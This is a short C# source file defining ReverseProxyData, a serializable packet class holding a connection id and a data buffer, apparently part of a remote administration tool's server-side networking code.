using System;
using xServer.Core.Networking;
using xServer.Core.Packets;

namespace xServer.Core.ReverseProxy.Packets
{
    [Serializable]
    public class ReverseProxyData : IPacket
    {
        public int ConnectionId { get; set; }

        public byte[] Data { get; set; }

        public ReverseProxyData()
        {
        }

        public ReverseProxyData(int connectionId, byte[] data)
        {
            this.ConnectionId = connectionId;
            this.Data = data;
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}
